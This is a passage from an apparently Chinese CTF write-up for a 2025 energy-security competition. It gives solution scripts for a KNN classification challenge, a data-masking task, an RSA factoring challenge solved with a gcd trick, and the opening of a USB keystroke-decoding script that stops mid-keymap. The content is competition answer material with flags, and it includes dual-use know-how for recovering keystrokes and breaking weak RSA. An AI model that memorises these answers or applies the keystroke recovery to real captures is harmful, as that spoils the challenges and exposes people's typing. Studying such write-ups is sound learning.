src="/images/%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2025-%E5%A4%8D%E7%8E%B0/image-20250418201538967.png" alt="image-20250418201538967"></p><p><img src="/images/%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2025-%E5%A4%8D%E7%8E%B0/image-20250418201552400.png" alt="image-20250418201552400"></p><h3 id="knn"><a href="#knn" class="headerlink" title="knn"></a>knn</h3><p>大体思路就是从检测数据的csv表格中读取A车和B车的数据，根据题目名称可知用knn算法训练模型，然后对待检测数据表格中的每一行数据进行识别判断出是A车还是B车，A车记为1，B车记为0，from bin得到flag</p><p>不清楚n_neighbors是多少，写个脚本爆破一下找找合乎格式的flag即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;1.csv&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">X = data[[<span class="string">&#x27;防碰撞评分&#x27;</span>, <span class="string">&#x27;电池容量评分&#x27;</span>, <span class="string">&#x27;智能驾驶能力&#x27;</span>, <span class="string">&#x27;智能座舱评分&#x27;</span>]]</span><br><span class="line">y = data[<span class="string">&#x27;名称&#x27;</span>].<span class="built_in">map</span>(&#123;<span class="string">&#x27;A车&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;B车&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">scaler = StandardScaler()</span><br><span class="line">X_scaled = scaler.fit_transform(X)</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X_scaled, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    knn = KNeighborsClassifier(n_neighbors=i)</span><br><span class="line">    knn.fit(X_train, y_train)</span><br><span class="line">    new_data = pd.read_csv(<span class="string">&#x27;2.csv&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    X_new = new_data[[<span class="string">&#x27;防碰撞评分&#x27;</span>, <span class="string">&#x27;电池容量评分&#x27;</span>, <span class="string">&#x27;智能驾驶能力&#x27;</span>, <span class="string">&#x27;智能座舱评分&#x27;</span>]]</span><br><span class="line">    X_new_scaled = scaler.transform(X_new)</span><br><span class="line">    predictions = knn.predict(X_new_scaled)</span><br><span class="line">    result = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, predictions)),<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(result))</span><br></pre></td></tr></table></figure><p>最终flag：</p><p>flag{e0f095bd-16e6-4bf5-a1c5-3dce1d693aa5}</p><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="数据脱敏"><a href="#数据脱敏" class="headerlink" title="数据脱敏"></a>数据脱敏</h3><p>题目要求</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">为了抵抗黑客攻击导致数据拖库等问题，需要将敏感数据识别并脱敏存储成⼀个表。给定脱敏算法逻辑，要求选⼿⽣成脱敏后的数据表数据（所有数据均为随机⽣成，与现实世界⽆任何联系）。为了防⽌⼀些隐私数据泄漏，现需要对该数据表进⾏脱敏操作，请按照指定要求对各字段进⾏脱敏处理，并按照先行后列拼接字符串（不包含标题行），对此字符串进行md5计算，得到答案。</span><br><span class="line"></span><br><span class="line">脱敏要求：</span><br><span class="line">编号：⽆需脱敏。</span><br><span class="line"></span><br><span class="line">姓名：⼆字姓名对最后⼀位字使⽤ * 进⾏替换，三字姓名对中间⼀位字使⽤ * 进⾏替换，四字姓名对中间两位字使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">手机号：请对中间五位信息使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">身份证号码：请对除了前6位信息使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">银⾏卡：请对前四位和后十位信息使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">Email：请对字符 @ 前除 . 外的字符使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">性别：替换成未知。</span><br><span class="line"></span><br><span class="line">微信号：请对为字符的信息使用 * 进行替换。</span><br></pre></td></tr></table></figure><p>比赛时以为是格式上有什么问题，怎么调都不对。没想到这里这个编号无需脱敏的意思是，编号也不用加到最终的字符串中。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> name[:-<span class="number">1</span>] + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(name) == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> name[:<span class="number">1</span>] + <span class="string">&#x27;*&#x27;</span> + name[-<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(name) == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> name[:<span class="number">1</span>] + <span class="string">&#x27;**&#x27;</span> + name[-<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="keyword">return</span> phone[:<span class="number">3</span>] + <span class="string">&#x27;*****&#x27;</span> + phone[-<span class="number">3</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_id</span>(<span class="params">id_number</span>):</span><br><span class="line">    <span class="keyword">return</span> id_number[:<span class="number">6</span>] + <span class="string">&#x27;*&#x27;</span> * (<span class="built_in">len</span>(id_number) - <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_bank_card</span>(<span class="params">bank_card</span>):</span><br><span class="line">    <span class="keyword">return</span> bank_card[:<span class="number">4</span>] + <span class="string">&#x27;*&#x27;</span> * (<span class="built_in">len</span>(bank_card) - <span class="number">14</span>) + bank_card[-<span class="number">10</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_email</span>(<span class="params">email</span>):</span><br><span class="line">    parts = email.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> parts[<span class="number">0</span>]:</span><br><span class="line">        prefix, suffix = parts[<span class="number">0</span>].rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        masked_prefix = <span class="string">&#x27;*&#x27;</span> * (<span class="built_in">len</span>(prefix) - <span class="number">1</span>) + prefix[-<span class="number">1</span>:] <span class="keyword">if</span> prefix <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> masked_prefix + <span class="string">&#x27;.&#x27;</span> + suffix + <span class="string">&#x27;@&#x27;</span> + parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span> * <span class="built_in">len</span>(parts[<span class="number">0</span>])+ <span class="string">&#x27;@&#x27;</span> + parts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_wechat</span>(<span class="params">wechat</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span> * <span class="built_in">len</span>(wechat)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_row</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;姓名&#x27;</span>: mask_name(<span class="built_in">str</span>(row[<span class="string">&#x27;姓名&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;手机号&#x27;</span>: mask_phone(<span class="built_in">str</span>(row[<span class="string">&#x27;手机号&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;身份证号&#x27;</span>: mask_id(<span class="built_in">str</span>(row[<span class="string">&#x27;身份证号&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;银行卡号&#x27;</span>: mask_bank_card(<span class="built_in">str</span>(row[<span class="string">&#x27;银行卡号&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;Email&#x27;</span>: mask_email(<span class="built_in">str</span>(row[<span class="string">&#x27;Email&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;性别&#x27;</span>: <span class="string">&#x27;未知&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;微信号&#x27;</span>: mask_wechat(<span class="built_in">str</span>(row[<span class="string">&#x27;微信号&#x27;</span>]))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取xlsx文件</span></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;data.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个列表来存储处理后的数据</span></span><br><span class="line">processed_data = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理每一行数据</span></span><br><span class="line"><span class="keyword">for</span> index, row <span class="keyword">in</span> df.iterrows():</span><br><span class="line">    processed_row = process_row(row)</span><br><span class="line">    processed_data.append(processed_row)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新的DataFrame</span></span><br><span class="line">new_df = pd.DataFrame(processed_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将所有处理过的数据拼接成一个字符串（不包括编号）</span></span><br><span class="line">combined_data = <span class="string">&#x27;&#x27;</span>.join(new_df.apply(<span class="keyword">lambda</span> row: <span class="string">&#x27;&#x27;</span>.join(row.values.astype(<span class="built_in">str</span>)), axis=<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(combined_data)</span><br><span class="line"><span class="comment"># 使用md5进行加密</span></span><br><span class="line">md5_hash = hashlib.md5(combined_data.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, md5_hash)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将处理后的数据写入新的xlsx文件</span></span><br><span class="line">new_df.to_excel(<span class="string">&#x27;masked_data.xlsx&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#Flag: b54cc7298aaaae763d605cf87bcd714a</span></span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="NumberTheory"><a href="#NumberTheory" class="headerlink" title="NumberTheory"></a>NumberTheory</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hint</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">k=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> hint + <span class="number">233</span> * k == <span class="number">233</span> * k * p</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 84099006955126261966925371456202769943592466221370095794235167154956697927281125181449320270460637820908574232493978429962263974458426503598700104493216727535451616752760724333653967152401716945549285008242019874215196489846481143398374860288545040874468108191037481101604627874268575884573685952474988256841</span></span><br><span class="line"><span class="comment"># 28098063654079651384124474197746356824080585622155888018279898490747561415908220072536298610509681898119018709183606442183944207485940115624047842734359988590155403601250406116023121958193303908964857108526965815235457652033182982467968474248778435731228104089366239566977364311197776651102290796373095167764</span></span><br><span class="line"><span class="comment"># 411245630228311610573345621334618725748702407327926883063919892785851166202383809662483938501531987094884084543300939673794551515912845363503988032311234800260819110323258416786417746444373651130257247926678135654564298408894174083333804257126735899220917359603430399033328133462456659839525671074605146583034398735379485362144932899212206419889556154825755723979850750847762362288223441051219637465296077020565435562941976546609555729574021362954126496825972439730</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由题<br>$$<br>hint+233<em>k&#x3D;233</em>k<em>p<br>$$<br>变换得<br>$$<br>hint&#x3D;233</em>k*(p-1)<br>$$<br>设a<br>$$<br>a^{hint}\equiv a^{233<em>k</em>(p-1)}(mod\ p)<br>$$</p><p>由费马小定理得<br>$$<br>a^{hint}\equiv1(mod\ p)<br>$$<br>因此<br>$$<br>p&#x3D;gcd(a^{hint}-1,n)<br>$$<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">84099006955126261966925371456202769943592466221370095794235167154956697927281125181449320270460637820908574232493978429962263974458426503598700104493216727535451616752760724333653967152401716945549285008242019874215196489846481143398374860288545040874468108191037481101604627874268575884573685952474988256841</span></span><br><span class="line">c=<span class="number">28098063654079651384124474197746356824080585622155888018279898490747561415908220072536298610509681898119018709183606442183944207485940115624047842734359988590155403601250406116023121958193303908964857108526965815235457652033182982467968474248778435731228104089366239566977364311197776651102290796373095167764</span></span><br><span class="line">hint=<span class="number">411245630228311610573345621334618725748702407327926883063919892785851166202383809662483938501531987094884084543300939673794551515912845363503988032311234800260819110323258416786417746444373651130257247926678135654564298408894174083333804257126735899220917359603430399033328133462456659839525671074605146583034398735379485362144932899212206419889556154825755723979850750847762362288223441051219637465296077020565435562941976546609555729574021362954126496825972439730</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">a=<span class="number">2</span></span><br><span class="line">p=gmpy2.gcd(<span class="built_in">pow</span>(a,hint,n)-<span class="number">1</span>,n)</span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;a3878d9436b7c80e6ecfda33b7b0b840&#125;</span></span><br></pre></td></tr></table></figure><h2 id="能源行业"><a href="#能源行业" class="headerlink" title="能源行业"></a>能源行业</h2><h3 id="usb"><a href="#usb" class="headerlink" title="usb"></a>usb</h3><p><del>又来见识新的妙妙工具了</del></p><p>经典usb流量，knm.py把所有hid data提取出来</p><p><img src="/images/%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2025-%E5%A4%8D%E7%8E%B0/image-20250425213629859.png" alt="image-20250425213629859"></p><p>然后处理数据</p><p><img src="/images/%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2025-%E5%A4%8D%E7%8E%B0/image-20250425214107329.png" alt="image-20250425214107329"></p><p>或者用祖传脚本对应按键解码hid data。解出来的东西不大精准，但大概也能看出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">KEYCODE_MAP = &#123;</span><br><span class="line">     <span class="number">0x04</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">0x05</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">0x06</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">0x07</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">0x08</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">0x09</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">0x0A</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">0x0B</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">     <span class="number">0x0C</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">0x0D</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">0x0E</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">0x0F</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">0x10</span>:<span class="string">&#x27;m&#x27;</span>, <span class="number">0x11</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">0x12</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">0x13</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">     <span class="number">0x14</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">0x15</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">0x16</span>:<span class="string">&#x27;s&#x27;</span>, <span class="number">0x17</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">0x18</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">0x19</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">0x1A</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">0x1B</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">     <span class="number">0x1C</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">0x1D</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">0x1E</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">0x1F</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">0x20</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">0x21</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">0x22</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">0x23</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">     <span class="number">0x24</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">0x25</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">0x26</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">0x27</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">0x28</span>: <span class="string">&#x27;\n&#x27;</span>, <span class="number">0x29</span>: <span class="string">&#x27;Escape&#x27;</span>, <span class="number">0x2A</span>: <span class="string">&#x27;Backspace&#x27;</span>,</span><br><span class="line">     <span class="number">0x2B</span>: <span class="string">&#x27;Tab&#x27;</span>, <span class="number">0x2C</span>:<span class="string">&#x27; &#x27;</span>, <span class="number">0x2D</span>: <span class="string">&#x27;-&#x27;</span>, <span class="number">0x2E</span>: <span class="string">&#x27;=&#x27;</span>, <span class="number">0x2F</span>: <span class="string">&#x27;[&#x27;</span>, <span class="number">0x30</span>: <span class="string">&#x27;]&#x27;</span>, <span class="number">0x31</span>: <span class="string">&#x27;\\&#x27;</span>, <span class="number">0x32</span>: <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">     <span class="number">0x33</span>: <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="number">0x34</span>: <span class="string">&#x27;`&#x27;</span>, <span class="number">0x35</span>: <span class="string">&#x27;,&#x27;</span>, <span class="number">0x36</span>: <span class="string">&#x27;.&#x27;</span>, <span class="number">0x37</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">0x38</span>: <span class="string">&#x27;Caps Lock&#x27;</span>, <span class="number">0x39</span>: <span class="string">&#x27;F1&#x27;</span>,</span><br><span class="line">     <span class="number">0x3A</span>: <span class="string">&#x27;F2&#x27;</span>, <span class="number">0x3B</span>: <span class="string">&#x27;F3&#x27;</span>, <span class="number">0x3C</span>: <span class="string">&#x27;F4&#x27;</span>, <span class="number">0x3D</span>: <span class="string">&#x27;F5&#x27;</span>, <span class="number">0x3E</span>: <span class="string">&#x27;F6&#x27;</span>, <span class="number">0x3F</span>: <span class="string">&#x27;F7&#x27;</span>, <span class="number">0x40</span>: <span class="string">&#x27;F8&#x27;</span>,</span><br><span class="line">     <span class="number">0x41</span>: <span class="string">&#x27;F9&#x27;</span>, <span class="number">0x42</span>: <span class="string">&#x27;F10&#x27;</span>, <span class="number">0x43</span>: <span class="string">&#x27;F11&#x27;</span>, <span class="number">0x44</span>: <span class="string">&#x27;F12&#x27;</span>, <span class="number">0x45</span>: <span class="string">&#x27;Print Screen&#x27;</span>, <span class="number">0x46</span>: <span class="string">&#x27;Scroll Lock&#x27;</span>,</span><br><span class="line">     <span class="number">0x47</span>: <span class="string">&#x27;Pause&#x27;</span>, <span class="number">0x48</span>: <span class="string">&#x27;Insert&#x27;</span>, <span class="number">0x49</span>: <span class="string">&#x27;Home&#x27;</span>, <span class="number">0x4A</span>: <span class="string">&#x27;Page Up&#x27;</span>, <span class="number">0x4B</span>: <span class="string">&#x27;Delete&#x27;</span>, <span class="number">0x4C</span>: <span class="string">&#x27;End&#x27;</span>,</span><br><span class="line">     <span class="number">0x4D</span>: <span class="string">&#x27;Page Down&#x27;</span>, <span class="number">0x4E</span>: <span class="string">&#x27;Right Arrow&#x27;</span>, <span class="number">0x4F</span>: <span class="string">&#x27;Left Arrow&#x27;</span>, <span class="number">0x50</span>: <span class="string">&#x27;Down Arrow&#x27;</span>, <span class="number">0x51</span>: <span class="string">&#x27;Up Arrow&#x27;</span>,</span><br><span class="line">     <span class="number">0x52</span>: <span class="string">&#x27;Num Lock&#x27;</span>, <span class="number">0x53</span>: <span class="string">&#x27;Keypad /&#x27;</span>, <span class="number">0x54</span>: <span class="string">&#x27;Keypad *&#x27;</span>, <span class="number">0x55</span>: <span class="string">&#x27;Keypad -&#x27;</span>, <span class="number">0x56</span>: <span class="string">&#x27;Keypad +&#x27;</span>,</span><br><span class="line">     <span class="number">0x57</span>: <span class="string">&#x27;Keypad Enter&#x27;</span>, <span class="number">0x58</span>: <span class="string">&#x27;Keypad 1&#x27;</span>, <span class="number">0x59</span>: <span class="string">&#x27;Keypad 2&#x27;</span>, <span class="number">0x5A</span>: <span class="string">&#x27;Keypad 3&#x27;</span>, <span class="number">0x5B</span>: <span class="string">&#x27;Keypad 4&#x27;</span>,</span><br><span class="line">     <span class="number">0x5C</span>: <span class="string">&#x27;Keypad 5&#x27;</span>, <span class="number">0x5D</span>: <span class="string">&#x27;Keypad 6&#x27;</span>, <span class="number">0x5E</span>: <span class="string">&#x27;Keypad 7&#x27;</span>, <span class="number">0x5F</span>: <span class="string">&#x27;Keypad 8&#x27;</span>, <span class="number">0x60</span>: <span class="string">&#x27;Keypad 9&#x27;</span>,</span><br><span class="line">     <span class="number">0x61</span>: <span class="string">&#x27;Keypad 0&#x27;</span>, <span class="number">0x62</span>: <span class="string">&#x27;Keypad .&#x27;</span>, <span class="number">0x63</span>: <span class="string">&#x27;Non-US # and ~&#x27;</span>, <span class="number">0x64</span>: <span class="string">&#x27;Application&#x27;</span>, <span class="number">0x65</span>: <span class="string">&#x27;Power&#x27;</span>,</span><br><span class="line">     <span class="number">0x66</span>: <span class="string">&#x27;Keypad =&#x27;</span>, <span class="number">0x67</span>: <span class="string">&#x27;F13&#x27;</span>, <span class="number">0x68</span>: <span class="string">&#x27;F14&#x27;</span>, <span class="number">0x69</span>: <span class="string">&#x27;F15&#x27;</span>, <span class="number">0x6A</span>: <span class="string">&#x27;F16&#x27;</span>, <span class="number">0x6B</span>: <span class="string">&#x27;F17&#x27;</span>, <span class="number">0x6C</span>: <span class="string">&#x27;F18&#x27;</span>,</span><br><span class="line">     <span class="number">0x6D</span>: <span class="string">&#x27;F19&#x27;</span>, <span class="number">0x6E</span>: <span class="string">&#x27;F20&#x27;</span>, <span class="number">0x6F</span>: <span class="string">&#x27;F21&#x27;</span>, <span class="number">0x70</span>: <span class="string">&#x27;F22&#x27;</span>, <span class="number">0x71</span>: <span class="string">&#x27;F23&#x27;</span>, <span class="number">0x72</span>: <span class="string">&#x27;F24&#x27;</span>, <span class="number">0x73</span>: <span class="string">&#x27;Execute&#x27;</span>,</span><br><span class="line">     <span class="number">0x74</span>: <span class="string">&#x27;Help&#x27;</span>, <span class="number">0x75</span>: <span class="string">&#x27;Menu&#x27;</span>, <span class="number">0x76</span>: <span class="string">&#x27;Select&#x27;</span>, <span class="number">0x77</span>: <span class="string">&#x27;Stop&#x27;</span>, <span class="number">0x78</span>: <span class="string">&#x27;Again&#x27;</span>, <span class="number">0x79</span>: <span class="string">&#x27;Undo&#x27;</span>,</span><br><span class="line">     <span class="number">0x7A</span>: <span class="string">&#x27;Cut&#x27;</span>, <span class="number">0x7B</span>: <span class="string">&#x27;Copy&#x27;</span>, <span class="number">0x7C</span>: <span 